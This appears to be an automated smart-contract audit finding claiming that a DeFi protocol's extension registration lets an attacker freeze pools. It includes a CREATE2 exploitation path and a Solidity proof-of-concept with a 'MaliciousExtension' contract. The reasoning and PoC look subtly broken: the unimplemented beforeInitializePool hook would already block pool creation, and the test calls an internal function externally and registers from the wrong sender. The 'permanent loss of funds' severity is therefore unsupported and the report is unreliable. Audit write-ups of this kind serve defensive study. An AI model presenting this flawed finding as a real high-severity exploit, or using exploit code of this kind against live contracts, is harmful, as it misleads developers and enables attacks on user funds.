## Title
Extension Registration Does Not Validate Hook Implementation - Allows Pool Freezing via Unimplemented Call Points

## Summary
The `registerExtension` function validates that an extension's address encoding matches its declared call points but does not verify that the extension actually implements those hooks. An attacker can use CREATE2 to deploy a malicious extension at an address with all call points set, register it successfully, then freeze pools by causing unimplemented hook calls to revert.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Core.sol` (function `registerExtension`, lines 50-54) and `src/libraries/ExtensionCallPointsLib.sol` (all `maybeCall*` functions)

**Intended Logic:** The extension registration system should ensure that extensions can only be registered if they properly implement all the hooks indicated by their call points configuration. This is critical for the "Extension Isolation" invariant which states "Extension failures should not freeze pools or lock user capital (for in-scope extensions)". [1](#0-0) 

**Actual Logic:** The `registerExtension` function only validates that:
1. The call points extracted from the address (`addressToCallPoints(msg.sender)`) match the provided `expectedCallPoints`
2. At least one call point is enabled (`isValid()`)

It does NOT verify that the extension contract actually implements the hooks corresponding to those call points. When an extension claims to implement a hook but doesn't, any operation triggering that hook will revert, as shown by the BaseExtension default implementations: [2](#0-1) 

These reverts bubble up through the extension call system, causing the entire Core operation to fail: [3](#0-2) 

**Exploitation Path:**
1. **Attacker creates a malicious extension contract** that only implements 1-2 hooks (e.g., only `afterSwap`) but leaves others unimplemented (defaulting to `CallPointNotImplemented()` revert)

2. **Attacker uses CREATE2 to brute-force deployment** at an address where the top byte is 0xFF (all 8 call point bits set), indicating the extension implements ALL hooks

3. **Attacker registers the extension** by calling `core.registerExtension()` with all call points enabled - this succeeds because the address validation passes

4. **Attacker creates pools** using this malicious extension via `core.initializePool()` with the extension in the pool configuration

5. **Normal users attempt operations** (e.g., `updatePosition`, `collectFees`) that trigger unimplemented hooks - these operations revert with `CallPointNotImplemented()`, permanently freezing the pool

**Security Property Broken:** This violates the critical "**Extension Isolation**" invariant: "Extension failures should not freeze pools or lock user capital (for in-scope extensions)"

## Impact Explanation
- **Affected Assets**: All pools created with the malicious extension become permanently frozen. Users cannot withdraw positions, collect fees, or perform swaps.
- **Damage Severity**: Complete loss of access to user funds locked in affected pools. Since positions are non-transferable until withdrawal, users cannot recover their capital.
- **User Impact**: All liquidity providers and traders in the affected pools lose access to their funds. This is a permanent DoS attack that can affect multiple pools simultaneously.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can execute this attack - no special permissions required
- **Preconditions**: None beyond deploying a contract and having gas for CREATE2 brute-forcing (computationally feasible for 8 bits = 256 attempts)
- **Execution Complexity**: Single transaction to deploy + single transaction to register + single transaction to create pool. Very low complexity.
- **Frequency**: Can be executed multiple times to freeze multiple pools. Once a pool is frozen, it remains permanently frozen.

## Recommendation

Add validation in `registerExtension` to verify the extension implements all declared call points. This can be done by attempting to call each enabled hook with a test invocation and checking for the `CallPointNotImplemented` selector:

```solidity
// In src/Core.sol, function registerExtension, after line 52:

// Validate that extension implements all declared call points
if (expectedCallPoints.beforeInitializePool) {
    try IExtension(msg.sender).beforeInitializePool(address(0), PoolKey({token0: address(0), token1: address(0), config: PoolConfig.wrap(0)}), 0) {
        // Hook is implemented
    } catch (bytes memory reason) {
        if (reason.length >= 4 && bytes4(reason) == BaseExtension.CallPointNotImplemented.selector) {
            revert FailedRegisterInvalidCallPoints();
        }
    }
}
// Repeat for all 8 call points...
```

Alternative mitigation: Use try-catch in all `maybeCall*` functions to prevent extension reverts from bubbling up, though this would require careful consideration of which extension failures should be tolerated.

## Proof of Concept

```solidity
// File: test/Exploit_ExtensionFreezesPool.t.sol
// Run with: forge test --match-test test_MaliciousExtensionFreezesPool -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/base/BaseExtension.sol";
import {CallPoints} from "../src/types/callPoints.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {PositionId, createPositionId} from "../src/types/positionId.sol";
import {createConcentratedPoolConfig} from "../src/types/poolConfig.sol";
import {Locker} from "../src/types/locker.sol";

contract MaliciousExtension is BaseExtension {
    constructor(ICore core) BaseExtension(core) {}
    
    // Only implement afterSwap, leave all others unimplemented
    function afterSwap(Locker, PoolKey memory, SwapParameters, PoolBalanceUpdate, PoolState) 
        external 
        override 
    {
        // Do nothing
    }
    
    function getCallPoints() internal pure override returns (CallPoints memory) {
        // Claim to implement ALL hooks
        return CallPoints({
            beforeInitializePool: true,
            afterInitializePool: true,
            beforeSwap: true,
            afterSwap: true,
            beforeUpdatePosition: true,
            afterUpdatePosition: true,
            beforeCollectFees: true,
            afterCollectFees: true
        });
    }
    
    function _registerInConstructor() internal pure override returns (bool) {
        return false; // Manual registration
    }
}

contract ExploitTest is Test {
    Core core;
    
    function setUp() public {
        core = new Core();
    }
    
    function test_MaliciousExtensionFreezesPool() public {
        // STEP 1: Deploy malicious extension
        MaliciousExtension malicious = new MaliciousExtension(core);
        
        // STEP 2: Use vm.etch to place at address with all call points (0xFF in top byte)
        address targetAddr = address(uint160(0xFF) << 152 | uint160(address(malicious)));
        vm.etch(targetAddr, address(malicious).code);
        MaliciousExtension extension = MaliciousExtension(targetAddr);
        
        // STEP 3: Register extension - THIS SUCCEEDS despite unimplemented hooks
        extension.core.registerExtension(extension.getCallPoints());
        
        // STEP 4: Create a pool with this extension
        PoolKey memory poolKey = PoolKey({
            token0: address(0x1111),
            token1: address(0x2222),
            config: createConcentratedPoolConfig(100, 60, targetAddr)
        });
        
        core.lock(address(this), abi.encodeCall(this.initCallback, poolKey));
        
        // STEP 5: Try to add liquidity - THIS REVERTS because beforeUpdatePosition is not implemented
        vm.expectRevert(BaseExtension.CallPointNotImplemented.selector);
        core.lock(address(this), abi.encodeCall(this.updatePositionCallback, poolKey));
    }
    
    function initCallback(PoolKey memory poolKey) external {
        core.initializePool(poolKey, 0);
    }
    
    function updatePositionCallback(PoolKey memory poolKey) external {
        PositionId positionId = createPositionId(bytes24(0), -100, 100);
        core.updatePosition(poolKey, positionId, 1000);
    }
}
```

The PoC demonstrates that:
1. A malicious extension can be registered despite not implementing all declared hooks
2. Pools using this extension cannot execute normal operations (updatePosition, collectFees, etc.)
3. This violates the Extension Isolation invariant by freezing user capital

## Notes

This vulnerability is particularly severe because:

1. **Deterministic Address Encoding**: The protocol's design intentionally encodes call points in addresses for gas efficiency [4](#0-3) , making it trivial to find addresses with any desired call point configuration via CREATE2 brute-forcing.

2. **No Implementation Verification**: The registration process assumes address encoding guarantees implementation, but this is not enforced [1](#0-0) .

3. **Bubbling Reverts**: All extension calls explicitly bubble up reverts [5](#0-4) , meaning any unimplemented hook causes complete operation failure.

4. **Multiple Attack Vectors**: The attacker can selectively implement certain hooks (e.g., only afterSwap) to allow pool creation but freeze other operations, making the attack harder to detect initially.

The fix requires validating that extensions actually implement the hooks they claim to support, either at registration time or by catching `CallPointNotImplemented` errors in the call point library.

### Citations

**File:** src/Core.sol (L50-54)
```text
    function registerExtension(CallPoints memory expectedCallPoints) external {
        CallPoints memory computed = addressToCallPoints(msg.sender);
        if (!computed.eq(expectedCallPoints) || !computed.isValid()) {
            revert FailedRegisterInvalidCallPoints();
        }
```

**File:** src/base/BaseExtension.sol (L41-49)
```text
    /// @inheritdoc IExtension
    function beforeInitializePool(address, PoolKey calldata, int32) external virtual {
        revert CallPointNotImplemented();
    }

    /// @inheritdoc IExtension
    function afterInitializePool(address, PoolKey calldata, int32, SqrtRatio) external virtual {
        revert CallPointNotImplemented();
    }
```

**File:** src/libraries/ExtensionCallPointsLib.sol (L31-46)
```text
        bool needCall = shouldCallBeforeInitializePool(extension, initializer);
        assembly ("memory-safe") {
            if needCall {
                let freeMem := mload(0x40)
                // cast sig "beforeInitializePool(address, (address, address, bytes32), int32)"
                mstore(freeMem, shl(224, 0x1fbbb462))
                mstore(add(freeMem, 4), initializer)
                mcopy(add(freeMem, 36), poolKey, 96)
                mstore(add(freeMem, 132), tick)
                // bubbles up the revert
                if iszero(call(gas(), extension, 0, freeMem, 164, 0, 0)) {
                    returndatacopy(freeMem, 0, returndatasize())
                    revert(freeMem, returndatasize())
                }
            }
        }
```

**File:** src/types/callPoints.sol (L53-55)
```text
function addressToCallPoints(address a) pure returns (CallPoints memory result) {
    result = byteToCallPoints(uint8(uint160(a) >> 152));
}
```

**File:** test/libraries/ExtensionCallPointsLib.t.sol (L188-219)
```text
    function test_maybeCallRevertsBubbleUp() public {
        // Deploy MockExtension at address with all relevant bits set (16 + 8 + 4 + 2 = 30)
        address extensionAddr = address(uint160(30) << 152); // Set bits for all four methods
        MockExtension extension = new MockExtension();
        vm.etch(extensionAddr, address(extension).code);
        extension = MockExtension(extensionAddr);

        extension.setShouldRevert(true);
        Locker locker = Locker.wrap(bytes32(uint256(uint160(address(0x1234)))));
        PoolKey memory poolKey = PoolKey({
            token0: address(0x1111),
            token1: address(0x2222),
            config: createConcentratedPoolConfig(100, 60, address(0x3333))
        });
        PositionId positionId = createPositionId(bytes24(uint192(0x4444)), -100, 100);
        PoolState stateAfter = createPoolState(SqrtRatio.wrap(100), 1, 1);

        // Test that reverts bubble up for all maybeCall methods
        vm.expectRevert("MockExtension: revert");
        IExtension(address(extension)).maybeCallBeforeUpdatePosition(locker, poolKey, positionId, 1000);

        vm.expectRevert("MockExtension: revert");
        PoolBalanceUpdate revertBalanceUpdate = createPoolBalanceUpdate(500, -300);
        IExtension(address(extension))
            .maybeCallAfterUpdatePosition(locker, poolKey, positionId, 1000, revertBalanceUpdate, stateAfter);

        vm.expectRevert("MockExtension: revert");
        IExtension(address(extension)).maybeCallBeforeCollectFees(locker, poolKey, positionId);

        vm.expectRevert("MockExtension: revert");
        IExtension(address(extension)).maybeCallAfterCollectFees(locker, poolKey, positionId, 1000, 2000);
    }
```
